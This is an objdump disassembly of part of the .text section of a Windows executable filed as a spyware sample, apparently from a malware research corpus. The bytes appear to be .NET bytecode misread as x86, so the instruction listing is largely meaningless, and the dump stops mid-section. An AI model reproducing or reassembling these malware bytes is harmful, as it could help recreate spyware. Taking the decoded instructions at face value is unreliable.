
malware_samples/spyware/6ac6fce5dddcd7e72952ba3c2e36e92c5c4aac45e2b5226060421193e882d996.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f0 e4 00             	lock in $0x0,%al
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 58 89 00       	add    $0x895800,%eax
  402013:	00 60 49             	add    %ah,0x49(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	09 00                	or     %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
  402020:	b8 d2 00 00 5e       	mov    $0x5e0000d2,%eax
  402025:	0a 00                	or     (%eax),%al
	...
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 05 00 56 00 00    	xor    %al,0x5600
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 7e 01             	adc    %edi,0x1(%esi)
  40205e:	00 00                	add    %al,(%eax)
  402060:	04 3a                	add    $0x3a,%al
  402062:	4b                   	dec    %ebx
  402063:	00 00                	add    %al,(%eax)
  402065:	00 17                	add    %dl,(%edi)
  402067:	80 01 00             	addb   $0x0,(%ecx)
  40206a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40206d:	0f 00 00             	sldt   (%eax)
  402070:	0a 20                	or     (%eax),%ah
  402072:	e9 07 00 00 20       	jmp    0x2040207e
  402077:	03 00                	add    (%eax),%eax
  402079:	00 00                	add    %al,(%eax)
  40207b:	20 04 00             	and    %al,(%eax,%eax,1)
  40207e:	00 00                	add    %al,(%eax)
  402080:	73 10                	jae    0x402092
  402082:	00 00                	add    %al,(%eax)
  402084:	0a 28                	or     (%eax),%ch
  402086:	11 00                	adc    %eax,(%eax)
  402088:	00 0a                	add    %cl,(%edx)
  40208a:	fe 0e                	decb   (%esi)
  40208c:	00 00                	add    %al,(%eax)
  40208e:	fe 0d 00 00 28 12    	decb   0x12280000
  402094:	00 00                	add    %al,(%eax)
  402096:	0a 28                	or     (%eax),%ch
  402098:	13 00                	adc    (%eax),%eax
  40209a:	00 0a                	add    %cl,(%edx)
  40209c:	20 0e                	and    %cl,(%esi)
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	00 3f                	add    %bh,(%edi)
  4020a2:	0b 00                	or     (%eax),%eax
  4020a4:	00 00                	add    %al,(%eax)
  4020a6:	72 01                	jb     0x4020a9
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	70 73                	jo     0x40211f
  4020ac:	14 00                	adc    $0x0,%al
  4020ae:	00 0a                	add    %cl,(%edx)
  4020b0:	7a 2a                	jp     0x4020dc
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	2e 28 2c 00          	sub    %ch,%cs:(%eax,%eax,1)
  4020b8:	00 06                	add    %al,(%esi)
  4020ba:	28 01                	sub    %al,(%ecx)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	06                   	push   %es
  4020bf:	2a 13                	sub    (%ebx),%dl
  4020c1:	30 06                	xor    %al,(%esi)
  4020c3:	00 af 00 00 00 02    	add    %ch,0x2000000(%edi)
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	11 28                	adc    %ebp,(%eax)
  4020cd:	2c 00                	sub    $0x0,%al
  4020cf:	00 06                	add    %al,(%esi)
  4020d1:	28 78 00             	sub    %bh,0x0(%eax)
  4020d4:	00 06                	add    %al,(%esi)
  4020d6:	02 28                	add    (%eax),%ch
  4020d8:	15 00 00 0a 16       	adc    $0x160a0000,%eax
  4020dd:	0a 16                	or     (%esi),%dl
  4020df:	0b 38                	or     (%eax),%edi
  4020e1:	3e 00 00             	add    %al,%ds:(%eax)
  4020e4:	00 7e 04             	add    %bh,0x4(%esi)
  4020e7:	00 00                	add    %al,(%eax)
  4020e9:	04 7e                	add    $0x7e,%al
  4020eb:	04 00                	add    $0x0,%al
  4020ed:	00 04 8e             	add    %al,(%esi,%ecx,4)
  4020f0:	69 7e 03 00 00 04 7e 	imul   $0x7e040000,0x3(%esi),%edi
  4020f7:	03 00                	add    (%eax),%eax
  4020f9:	00 04 8e             	add    %al,(%esi,%ecx,4)
  4020fc:	69 28 08 00 00 06    	imul   $0x6000008,(%eax),%ebp
  402102:	7e 05                	jle    0x402109
  402104:	00 00                	add    %al,(%eax)
  402106:	04 7e                	add    $0x7e,%al
  402108:	05 00 00 04 8e       	add    $0x8e040000,%eax
  40210d:	69 7e 02 00 00 04 7e 	imul   $0x7e040000,0x2(%esi),%edi
  402114:	02 00                	add    (%eax),%al
  402116:	00 04 8e             	add    %al,(%esi,%ecx,4)
  402119:	69 28 08 00 00 06    	imul   $0x6000008,(%eax),%ebp
  40211f:	07                   	pop    %es
  402120:	17                   	pop    %ss
  402121:	58                   	pop    %eax
  402122:	0b 07                	or     (%edi),%eax
  402124:	17                   	pop    %ss
  402125:	3f                   	aas
  402126:	bb ff ff ff 72       	mov    $0x72ffffff,%ebx
  40212b:	ea 00 00 70 28 06 00 	ljmp   $0x6,$0x28700000
  402132:	00 06                	add    %al,(%esi)
  402134:	72 04                	jb     0x40213a
  402136:	01 00                	add    %eax,(%eax)
  402138:	70 28                	jo     0x402162
  40213a:	05 00 00 06 28       	add    $0x28060000,%eax
  40213f:	01 00                	add    %eax,(%eax)
  402141:	00 2b                	add    %ch,(%ebx)
  402143:	7e 04                	jle    0x402149
  402145:	00 00                	add    %al,(%eax)
  402147:	04 16                	add    $0x16,%al
  402149:	8f                   	(bad)
  40214a:	1d 00 00 01 7e       	sbb    $0x7e010000,%eax
  40214f:	04 00                	add    $0x0,%al
  402151:	00 04 8e             	add    %al,(%esi,%ecx,4)
  402154:	69 1f 40 12 00 6f    	imul   $0x6f001240,(%edi),%ebx
  40215a:	0d 00 00 06 7e       	or     $0x7e060000,%eax
  40215f:	04 00                	add    $0x0,%al
  402161:	00 04 20             	add    %al,(%eax,%eiz,1)
  402164:	88 01                	mov    %al,(%ecx)
  402166:	00 00                	add    %al,(%eax)
  402168:	8f                   	(bad)
  402169:	1d 00 00 01 7e       	sbb    $0x7e010000,%eax
  40216e:	05 00 00 04 16       	add    $0x16040000,%eax
  402173:	16                   	push   %ss
  402174:	16                   	push   %ss
  402175:	28 07                	sub    %al,(%edi)
  402177:	00 00                	add    %al,(%eax)
  402179:	06                   	push   %es
  40217a:	2a 00                	sub    (%eax),%al
  40217c:	8a 28                	mov    (%eax),%ch
  40217e:	2c 00                	sub    $0x0,%al
  402180:	00 06                	add    %al,(%esi)
  402182:	28 78 00             	sub    %bh,0x0(%eax)
  402185:	00 06                	add    %al,(%esi)
  402187:	1f                   	pop    %ds
  402188:	0b 8d 1d 00 00 01    	or     0x100001d(%ebp),%ecx
  40218e:	25 d0 06 00 00       	and    $0x6d0,%eax
  402193:	04 28                	add    $0x28,%al
  402195:	17                   	pop    %ss
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  40219e:	2a 00                	sub    (%eax),%al
  4021a0:	1b 30                	sbb    (%eax),%esi
  4021a2:	06                   	push   %es
  4021a3:	00 6d 08             	add    %ch,0x8(%ebp)
  4021a6:	00 00                	add    %al,(%eax)
  4021a8:	03 00                	add    (%eax),%eax
  4021aa:	00 11                	add    %dl,(%ecx)
  4021ac:	20 41 41             	and    %al,0x41(%ecx)
  4021af:	3f                   	aas
  4021b0:	18 0a                	sbb    %cl,(%edx)
  4021b2:	20 8f c8 ab 06 0b    	and    %cl,0xb06abc8(%edi)
  4021b8:	20 db                	and    %bl,%bl
  4021ba:	14 7d                	adc    $0x7d,%al
  4021bc:	5a                   	pop    %edx
  4021bd:	20 5c 34 02          	and    %bl,0x2(%esp,%esi,1)
  4021c1:	41                   	inc    %ecx
  4021c2:	0c 20                	or     $0x20,%al
  4021c4:	59                   	pop    %ecx
  4021c5:	02 d2                	add    %dl,%dl
  4021c7:	4a                   	dec    %edx
  4021c8:	0d 20 5b 78 2c       	or     $0x2c785b20,%eax
  4021cd:	5a                   	pop    %edx
  4021ce:	13 04 20             	adc    (%eax,%eiz,1),%eax
  4021d1:	13 a7 5e 02 13 05    	adc    0x513025e(%edi),%esp
  4021d7:	20 76 c7             	and    %dh,-0x39(%esi)
  4021da:	e0 6f                	loopne 0x40224b
  4021dc:	13 06                	adc    (%esi),%eax
  4021de:	20 25 a6 00 1d 13    	and    %ah,0x131d00a6
  4021e4:	07                   	pop    %es
  4021e5:	20 01                	and    %al,(%ecx)
  4021e7:	97                   	xchg   %eax,%edi
  4021e8:	73 27                	jae    0x402211
  4021ea:	13 08                	adc    (%eax),%ecx
  4021ec:	20 ee                	and    %ch,%dh
  4021ee:	3c d2                	cmp    $0xd2,%al
  4021f0:	62 13                	bound  %edx,(%ebx)
  4021f2:	09 20                	or     %esp,(%eax)
  4021f4:	47                   	inc    %edi
  4021f5:	9b                   	fwait
  4021f6:	f8                   	clc
  4021f7:	15 13 0a 20 9f       	adc    $0x9f200a13,%eax
  4021fc:	59                   	pop    %ecx
  4021fd:	d3 27                	shll   %cl,(%edi)
  4021ff:	13 0b                	adc    (%ebx),%ecx
  402201:	20 9e b3 00 1c 13    	and    %bl,0x131c00b3(%esi)
  402207:	0c 20                	or     $0x20,%al
  402209:	b5 aa                	mov    $0xaa,%ch
  40220b:	11 45 13             	adc    %eax,0x13(%ebp)
  40220e:	0d 20 83 b2 a1       	or     $0xa1b28320,%eax
  402213:	08 13                	or     %dl,(%ebx)
  402215:	0e                   	push   %cs
  402216:	20 3a                	and    %bh,(%edx)
  402218:	65 17                	gs pop %ss
  40221a:	4e                   	dec    %esi
  40221b:	13 0f                	adc    (%edi),%ecx
  40221d:	20 09                	and    %cl,(%ecx)
  40221f:	09 db                	or     %ebx,%ebx
  402221:	1d 13 10 20 25       	sbb    $0x25201013,%eax
  402226:	60                   	pusha
  402227:	e6 14                	out    %al,$0x14
  402229:	13 11                	adc    (%ecx),%edx
  40222b:	20 75 08             	and    %dh,0x8(%ebp)
  40222e:	b2 54                	mov    $0x54,%dl
  402230:	13 12                	adc    (%edx),%edx
  402232:	20 2b                	and    %ch,(%ebx)
  402234:	28 f3                	sub    %dh,%bl
  402236:	20 13                	and    %dl,(%ebx)
  402238:	13 20                	adc    (%eax),%esp
  40223a:	e6 0a                	out    %al,$0xa
  40223c:	f2 5d                	repnz pop %ebp
  40223e:	13 14 20             	adc    (%eax,%eiz,1),%edx
  402241:	57                   	push   %edi
  402242:	f7 95 12 13 15 20    	notl   0x20151312(%ebp)
  402248:	eb 3b                	jmp    0x402285
  40224a:	8c 17                	mov    %ss,(%edi)
  40224c:	13 16                	adc    (%esi),%edx
  40224e:	20 d4                	and    %dl,%ah
  402250:	59                   	pop    %ecx
  402251:	af                   	scas   %es:(%edi),%eax
  402252:	5d                   	pop    %ebp
  402253:	13 17                	adc    (%edi),%edx
  402255:	20 5c cb be          	and    %bl,-0x42(%ebx,%ecx,8)
  402259:	64 13 18             	adc    %fs:(%eax),%ebx
  40225c:	20 5c c7 a2          	and    %bl,-0x5e(%edi,%eax,8)
  402260:	76 13                	jbe    0x402275
  402262:	19 20                	sbb    %esp,(%eax)
  402264:	fb                   	sti
  402265:	ae                   	scas   %es:(%edi),%al
  402266:	04 51                	add    $0x51,%al
  402268:	13 1a                	adc    (%edx),%ebx
  40226a:	20 fc                	and    %bh,%ah
  40226c:	02 e6                	add    %dh,%ah
  40226e:	3c 13                	cmp    $0x13,%al
  402270:	1b 20                	sbb    (%eax),%esp
  402272:	5d                   	pop    %ebp
  402273:	32 b3 1f 13 1c 20    	xor    0x201c131f(%ebx),%dh
  402279:	e5 a4                	in     $0xa4,%eax
  40227b:	ad                   	lods   %ds:(%esi),%eax
  40227c:	27                   	daa
  40227d:	13 1d 20 6f bd 0b    	adc    0xbbd6f20,%ebx
  402283:	05 13 1e 20 77       	add    $0x77201e13,%eax
  402288:	c3                   	ret
  402289:	1e                   	push   %ds
  40228a:	10 13                	adc    %dl,(%ebx)
  40228c:	1f                   	pop    %ds
  40228d:	20 bb 21 6a 2b 13    	and    %bh,0x132b6a21(%ebx)
  402293:	20 20                	and    %ah,(%eax)
  402295:	78 be                	js     0x402255
  402297:	08 19                	or     %bl,(%ecx)
  402299:	13 21                	adc    (%ecx),%esp
  40229b:	20 36                	and    %dh,(%esi)
  40229d:	03 ed                	add    %ebp,%ebp
  40229f:	38 13                	cmp    %dl,(%ebx)
  4022a1:	22 20                	and    (%eax),%ah
  4022a3:	bc 88 81 2e 13       	mov    $0x132e8188,%esp
  4022a8:	23 20                	and    (%eax),%esp
  4022aa:	8c 16                	mov    %ss,(%esi)
  4022ac:	26 01 13             	add    %edx,%es:(%ebx)
  4022af:	24 20                	and    $0x20,%al
  4022b1:	20 c4                	and    %al,%ah
  4022b3:	ee                   	out    %al,(%dx)
  4022b4:	15 13 25 20 04       	adc    $0x4202513,%eax
  4022b9:	67 d3 3d             	sarl   %cl,(%di)
  4022bc:	13 26                	adc    (%esi),%esp
  4022be:	20 f0                	and    %dh,%al
  4022c0:	3b 3a                	cmp    (%edx),%edi
  4022c2:	4e                   	dec    %esi
  4022c3:	13 27                	adc    (%edi),%esp
  4022c5:	20 7c a6 af          	and    %bh,-0x51(%esi,%eiz,4)
  4022c9:	4b                   	dec    %ebx
  4022ca:	13 28                	adc    (%eax),%ebp
  4022cc:	20 5c 07 9b          	and    %bl,-0x65(%edi,%eax,1)
  4022d0:	6a 13                	push   $0x13
  4022d2:	29 20                	sub    %esp,(%eax)
  4022d4:	70 f4                	jo     0x4022ca
  4022d6:	b9 3a 13 2a 20       	mov    $0x202a133a,%ecx
  4022db:	5f                   	pop    %edi
  4022dc:	87 e1                	xchg   %esp,%ecx
  4022de:	59                   	pop    %ecx
  4022df:	20 b7 47 87 5a 13    	and    %dh,0x135a8747(%edi)
  4022e5:	2b 20                	sub    (%eax),%esp
  4022e7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4022e8:	9d                   	popf
  4022e9:	83 18 13             	sbbl   $0x13,(%eax)
  4022ec:	2c 6e                	sub    $0x6e,%al
  4022ee:	11 21                	adc    %esp,(%ecx)
  4022f0:	6a 26                	push   $0x26
  4022f2:	26 11 29             	adc    %ebp,%es:(%ecx)
  4022f5:	11 22                	adc    %esp,(%edx)
  4022f7:	3e 0e                	ds push %cs
  4022f9:	00 00                	add    %al,(%eax)
  4022fb:	00 11                	add    %dl,(%ecx)
  4022fd:	0a 6e 11             	or     0x11(%esi),%ch
  402300:	11 6a 5b             	adc    %ebp,0x5b(%edx)
  402303:	6d                   	insl   (%dx),%es:(%edi)
  402304:	0c 38                	or     $0x38,%al
  402306:	11 00                	adc    %eax,(%eax)
  402308:	00 00                	add    %al,(%eax)
  40230a:	11 27                	adc    %esp,(%edi)
  40230c:	11 1d 5c 13 06 11    	adc    %ebx,0x1106135c
  402312:	0f 6a 11             	punpckhdq (%ecx),%mm2
  402315:	18 6e 5b             	sbb    %ch,0x5b(%esi)
  402318:	6d                   	insl   (%dx),%es:(%edi)
  402319:	13 16                	adc    (%esi),%edx
  40231b:	6e                   	outsb  %ds:(%esi),(%dx)
  40231c:	11 21                	adc    %esp,(%ecx)
  40231e:	6a 3d                	push   $0x3d
  402320:	08 00                	or     %al,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	11 10                	adc    %edx,(%eax)
  402326:	6a 11                	push   $0x11
  402328:	0c 6e                	or     $0x6e,%al
  40232a:	5b                   	pop    %ebx
  40232b:	26 11 18             	adc    %ebx,%es:(%eax)
  40232e:	6e                   	outsb  %ds:(%esi),(%dx)
  40232f:	11 08                	adc    %ecx,(%eax)
  402331:	6a 3f                	push   $0x3f
  402333:	0d 00 00 00 11       	or     $0x11000000,%eax
  402338:	15 6e 11 17 6a       	adc    $0x6a17116e,%eax
  40233d:	5b                   	pop    %ebx
  40233e:	26 38 0e             	cmp    %cl,%es:(%esi)
  402341:	00 00                	add    %al,(%eax)
  402343:	00 11                	add    %dl,(%ecx)
  402345:	28 11                	sub    %dl,(%ecx)
  402347:	0b 5c 13 12          	or     0x12(%ebx,%edx,1),%ebx
  40234b:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40234e:	1f                   	pop    %ds
  40234f:	5a                   	pop    %edx
  402350:	13 11                	adc    (%ecx),%edx
  402352:	03 3a                	add    (%edx),%edi
  402354:	01 00                	add    %eax,(%eax)
  402356:	00 00                	add    %al,(%eax)
  402358:	2a 20                	sub    (%eax),%ah
  40235a:	00 01                	add    %al,(%ecx)
  40235c:	00 00                	add    %al,(%eax)
  40235e:	8d 1d 00 00 01 13    	lea    0x13010000,%ebx
  402364:	2d 20 00 01 00       	sub    $0x10020,%eax
  402369:	00 8d 1d 00 00 01    	add    %cl,0x100001d(%ebp)
  40236f:	13 2e                	adc    (%esi),%ebp
  402371:	11 04 6e             	adc    %eax,(%esi,%ebp,2)
  402374:	11 14 6a             	adc    %edx,(%edx,%ebp,2)
  402377:	3d 0c 00 00 00       	cmp    $0xc,%eax
  40237c:	08 09                	or     %cl,(%ecx)
  40237e:	5a                   	pop    %edx
  40237f:	13 20                	adc    (%eax),%esp
  402381:	11 2b                	adc    %ebp,(%ebx)
  402383:	11 07                	adc    %eax,(%edi)
  402385:	59                   	pop    %ecx
  402386:	13 14 11             	adc    (%ecx,%edx,1),%edx
  402389:	21 11                	and    %edx,(%ecx)
  40238b:	20 3e                	and    %bh,(%esi)
  40238d:	0a 00                	or     (%eax),%al
  40238f:	00 00                	add    %al,(%eax)
  402391:	11 2c 6e             	adc    %ebp,(%esi,%ebp,2)
  402394:	11 09                	adc    %ecx,(%ecx)
  402396:	6a 5b                	push   $0x5b
  402398:	69 13 13 16 13 2f    	imul   $0x2f131613,(%ebx),%edx
  40239e:	38 2e                	cmp    %ch,(%esi)
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	11 2d 11 2f 12 2f    	adc    %ebp,0x2f122f11
  4023aa:	28 18                	sub    %bl,(%eax)
  4023ac:	00 00                	add    %al,(%eax)
  4023ae:	0a 28                	or     (%eax),%ch
  4023b0:	19 00                	sbb    %eax,(%eax)
  4023b2:	00 0a                	add    %cl,(%edx)
  4023b4:	9c                   	pushf
  4023b5:	11 2e                	adc    %ebp,(%esi)
  4023b7:	11 2f                	adc    %ebp,(%edi)
  4023b9:	04 11                	add    $0x11,%al
  4023bb:	2f                   	das
  4023bc:	05 5d 91 9c dd       	add    $0xdd9c915d,%eax
  4023c1:	06                   	push   %es
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	00 26                	add    %ah,(%esi)
  4023c6:	dd 00                	fldl   (%eax)
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	00 11                	add    %dl,(%ecx)
  4023cc:	2f                   	das
  4023cd:	17                   	pop    %ss
  4023ce:	58                   	pop    %eax
  4023cf:	13 2f                	adc    (%edi),%ebp
  4023d1:	11 2f                	adc    %ebp,(%edi)
  4023d3:	20 00                	and    %al,(%eax)
  4023d5:	01 00                	add    %eax,(%eax)
  4023d7:	00 3f                	add    %bh,(%edi)
  4023d9:	c6                   	(bad)
  4023da:	ff                   	(bad)
  4023db:	ff                   	(bad)
  4023dc:	ff 11                	call   *(%ecx)
  4023de:	0e                   	push   %cs
  4023df:	6e                   	outsb  %ds:(%esi),(%dx)
  4023e0:	11 29                	adc    %ebp,(%ecx)
  4023e2:	6a 3e                	push   $0x3e
  4023e4:	0d 00 00 00 11       	or     $0x11000000,%eax
  4023e9:	26 11 13             	adc    %edx,%es:(%ebx)
  4023ec:	61                   	popa
  4023ed:	13 0e                	adc    (%esi),%ecx
  4023ef:	11 0d 11 1c 5b 26    	adc    %ecx,0x265b1c11
  4023f5:	16                   	push   %ss
  4023f6:	13 2f                	adc    (%edi),%ebp
  4023f8:	16                   	push   %ss
  4023f9:	13 30                	adc    (%eax),%esi
  4023fb:	38 34 00             	cmp    %dh,(%eax,%eax,1)
  4023fe:	00 00                	add    %al,(%eax)
  402400:	11 30                	adc    %esi,(%eax)
  402402:	11 2d 11 2f 91 58    	adc    %ebp,0x58912f11
  402408:	11 2e                	adc    %ebp,(%esi)
  40240a:	11 2f                	adc    %ebp,(%edi)
  40240c:	91                   	xchg   %eax,%ecx
  40240d:	58                   	pop    %eax
  40240e:	20 00                	and    %al,(%eax)
  402410:	01 00                	add    %eax,(%eax)
  402412:	00 5d 13             	add    %bl,0x13(%ebp)
  402415:	30 11                	xor    %dl,(%ecx)
  402417:	2d 11 30 91 13       	sub    $0x13913011,%eax
  40241c:	32 11                	xor    (%ecx),%dl
  40241e:	2d 11 30 11 2d       	sub    $0x2d113011,%eax
  402423:	11 2f                	adc    %ebp,(%edi)
  402425:	91                   	xchg   %eax,%ecx
  402426:	9c                   	pushf
  402427:	11 2d 11 2f 11 32    	adc    %ebp,0x32112f11
  40242d:	9c                   	pushf
  40242e:	11 2f                	adc    %ebp,(%edi)
  402430:	17                   	pop    %ss
  402431:	58                   	pop    %eax
  402432:	13 2f                	adc    (%edi),%ebp
  402434:	11 2f                	adc    %ebp,(%edi)
  402436:	20 00                	and    %al,(%eax)
  402438:	01 00                	add    %eax,(%eax)
  40243a:	00 3f                	add    %bh,(%edi)
  40243c:	c0 ff ff             	sar    $0xff,%bh
  40243f:	ff 16                	call   *(%esi)
  402441:	13 2f                	adc    (%edi),%ebp
  402443:	16                   	push   %ss
  402444:	13 30                	adc    (%eax),%esi
  402446:	16                   	push   %ss
  402447:	13 31                	adc    (%ecx),%esi
  402449:	16                   	push   %ss
  40244a:	13 33                	adc    (%ebx),%esi
  40244c:	38 92 02 00 00 20    	cmp    %dl,0x20000002(%edx)
  402452:	39 b8 e9 5e 13 34    	cmp    %edi,0x34135ee9(%eax)
  402458:	20 1b                	and    %bl,(%ebx)
  40245a:	92                   	xchg   %eax,%edx
  40245b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40245c:	72 13                	jb     0x402471
  40245e:	35 20 b8 d9 60       	xor    $0x60d9b820,%eax
  402463:	09 13                	or     %edx,(%ebx)
  402465:	36 20 d1             	ss and %dl,%cl
  402468:	df 27                	fbld   (%edi)
  40246a:	41                   	inc    %ecx
  40246b:	13 37                	adc    (%edi),%esi
  40246d:	20 60 88             	and    %ah,-0x78(%eax)
  402470:	81 25 13 38 20 b6 c1 	andl   $0x1342a0c1,0xb6203813
  402477:	a0 42 13 
  40247a:	39 20                	cmp    %esp,(%eax)
  40247c:	87 64 b0 0e          	xchg   %esp,0xe(%eax,%esi,4)
  402480:	13 3a                	adc    (%edx),%edi
  402482:	20 95 c4 f2 78 13    	and    %dl,0x1378f2c4(%ebp)
  402488:	3b 20                	cmp    (%eax),%esp
  40248a:	4a                   	dec    %edx
  40248b:	58                   	pop    %eax
  40248c:	c6                   	(bad)
  40248d:	6b 13 3c             	imul   $0x3c,(%ebx),%edx
  402490:	20 9a d1 7c 28 13    	and    %bl,0x13287cd1(%edx)
  402496:	3d 20 65 8e 70       	cmp    $0x708e6520,%eax
  40249b:	73 13                	jae    0x4024b0
  40249d:	3e 20 65 54          	and    %ah,%ds:0x54(%ebp)
  4024a1:	c7 41 13 3f 20 6d f4 	movl   $0xf46d203f,0x13(%ecx)
  4024a8:	85 7b 13             	test   %edi,0x13(%ebx)
  4024ab:	40                   	inc    %eax
  4024ac:	20 16                	and    %dl,(%esi)
  4024ae:	01 a4 3e 13 41 20 c8 	add    %esp,-0x37dfbeed(%esi,%edi,1)
  4024b5:	2a 72 31             	sub    0x31(%edx),%dh
  4024b8:	13 42 20             	adc    0x20(%edx),%eax
  4024bb:	a1 b3 53 5b 13       	mov    0x135b53b3,%eax
  4024c0:	43                   	inc    %ebx
  4024c1:	20 7a 94             	and    %bh,-0x6c(%edx)
  4024c4:	10 3e                	adc    %bh,(%esi)
  4024c6:	13 44 20 91          	adc    -0x6f(%eax,%eiz,1),%eax
  4024ca:	d0 e5                	shl    $1,%ch
  4024cc:	47                   	inc    %edi
  4024cd:	13 45 20             	adc    0x20(%ebp),%eax
  4024d0:	bf 71 77 37 13       	mov    $0x13377771,%edi
  4024d5:	46                   	inc    %esi
  4024d6:	20 4e 2f             	and    %cl,0x2f(%esi)
  4024d9:	32 27                	xor    (%edi),%ah
  4024db:	13 47 20             	adc    0x20(%edi),%eax
  4024de:	af                   	scas   %es:(%edi),%eax
  4024df:	8c fd                	mov    %?,%ebp
  4024e1:	19 13                	sbb    %edx,(%ebx)
  4024e3:	48                   	dec    %eax
  4024e4:	20 a0 33 00 70 13    	and    %ah,0x13700033(%eax)
  4024ea:	49                   	dec    %ecx
  4024eb:	20 33                	and    %dh,(%ebx)
  4024ed:	95                   	xchg   %eax,%ebp
  4024ee:	2c 4c                	sub    $0x4c,%al
  4024f0:	20 fe                	and    %bh,%dh
  4024f2:	26 da 09             	fimull %es:(%ecx)
  4024f5:	20 df                	and    %bl,%bh
  4024f7:	49                   	dec    %ecx
  4024f8:	46                   	inc    %esi
  4024f9:	7f 13                	jg     0x40250e
  4024fb:	4a                   	dec    %edx
  4024fc:	20 a6 31 b7 69 13    	and    %ah,0x1369b731(%esi)
  402502:	4b                   	dec    %ebx
  402503:	20 c5                	and    %al,%ch
  402505:	d9 89 24 13 4c 20    	(bad) 0x204c1324(%ecx)
  40250b:	9f                   	lahf
  40250c:	ea b7 70 20 63 0f b4 	ljmp   $0xb40f,$0x632070b7
  402513:	40                   	inc    %eax
  402514:	13 4d 20             	adc    0x20(%ebp),%ecx
  402517:	fc                   	cld
  402518:	56                   	push   %esi
  402519:	11 64 13 4e          	adc    %esp,0x4e(%ebx,%edx,1)
  40251d:	20 46 ff             	and    %al,-0x1(%esi)
  402520:	97                   	xchg   %eax,%edi
  402521:	04 13                	add    $0x13,%al
  402523:	4f                   	dec    %edi
  402524:	20 f9                	and    %bh,%cl
  402526:	a2 2e 0a 13 50       	mov    %al,0x50130a2e
  40252b:	20 ff                	and    %bh,%bh
  40252d:	b8 33 52 13 51       	mov    $0x51135233,%eax
  402532:	20 d7                	and    %dl,%bh
  402534:	7c b8                	jl     0x4024ee
  402536:	01 13                	add    %edx,(%ebx)
  402538:	52                   	push   %edx
  402539:	20 e4                	and    %ah,%ah
  40253b:	be 37 78 13 53       	mov    $0x53137837,%esi
  402540:	20 95 69 59 7e 13    	and    %dl,0x137e5969(%ebp)
  402546:	54                   	push   %esp
  402547:	20 07                	and    %al,(%edi)
  402549:	f5                   	cmc
  40254a:	68 04 13 55 20       	push   $0x20551304
  40254f:	3f                   	aas
  402550:	a0 17 6f 13 56       	mov    0x56136f17,%al
  402555:	20 5a ff             	and    %bl,-0x1(%edx)
  402558:	da 10                	ficoml (%eax)
  40255a:	13 57 20             	adc    0x20(%edi),%edx
  40255d:	62 48 b4             	bound  %ecx,-0x4c(%eax)
  402560:	5a                   	pop    %edx
  402561:	13 58 20             	adc    0x20(%eax),%ebx
  402564:	fc                   	cld
  402565:	e8 42 5b 13 59       	call   0x595380ac
  40256a:	20 e2                	and    %ah,%dl
  40256c:	aa                   	stos   %al,%es:(%edi)
  40256d:	26 59                	es pop %ecx
  40256f:	13 5a 20             	adc    0x20(%edx),%ebx
  402572:	7d 3b                	jge    0x4025af
  402574:	37                   	aaa
  402575:	25 13 5b 20 05       	and    $0x5205b13,%eax
  40257a:	bd 12 39 13 5c       	mov    $0x5c133912,%ebp
  40257f:	20 6f 2f             	and    %ch,0x2f(%edi)
  402582:	33 13                	xor    (%ebx),%edx
  402584:	13 5d 20             	adc    0x20(%ebp),%ebx
  402587:	60                   	pusha
  402588:	05 85 5d 13 5e       	add    $0x5e135d85,%eax
  40258d:	20 9a a0 43 68 13    	and    %bl,0x136843a0(%edx)
  402593:	5f                   	pop    %edi
  402594:	20 99 a3 65 59 13    	and    %bl,0x135965a3(%ecx)
  40259a:	60                   	pusha
  40259b:	20 46 12             	and    %al,0x12(%esi)
  40259e:	4e                   	dec    %esi
  40259f:	1a 13                	sbb    (%ebx),%dl
  4025a1:	61                   	popa
  4025a2:	20 a8 1b ac 3f 13    	and    %ch,0x133fac1b(%eax)
  4025a8:	62 20                	bound  %esp,(%eax)
  4025aa:	fb                   	sti
  4025ab:	d9 74 6d 13          	fnstenv 0x13(%ebp,%ebp,2)
  4025af:	63 20                	arpl   %esp,(%eax)
  4025b1:	35 0f 8c 2c 13       	xor    $0x132c8c0f,%eax
  4025b6:	64 11 5b 11          	adc    %ebx,%fs:0x11(%ebx)
  4025ba:	61                   	popa
  4025bb:	5a                   	pop    %edx
  4025bc:	13 4c 11 41          	adc    0x41(%ecx,%edx,1),%ecx
  4025c0:	6a 11                	push   $0x11
  4025c2:	60                   	pusha
  4025c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4025c4:	61                   	popa
  4025c5:	69 13 34 11 3b 11    	imul   $0x113b1134,(%ebx),%edx
  4025cb:	3a 5a 13             	cmp    0x13(%edx),%bl
  4025ce:	61                   	popa
  4025cf:	11 3c 6e             	adc    %edi,(%esi,%ebp,2)
  4025d2:	11 39                	adc    %edi,(%ecx)
  4025d4:	6a 61                	push   $0x61
  4025d6:	6d                   	insl   (%dx),%es:(%edi)
  4025d7:	13 3a                	adc    (%edx),%edi
  4025d9:	11 63 6a             	adc    %esp,0x6a(%ebx)
  4025dc:	11 5c 6e 3c          	adc    %ebx,0x3c(%esi,%ebp,2)
  4025e0:	0c 00                	or     $0x0,%al
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	11 43 11             	adc    %eax,0x11(%ebx)
  4025e7:	44                   	inc    %esp
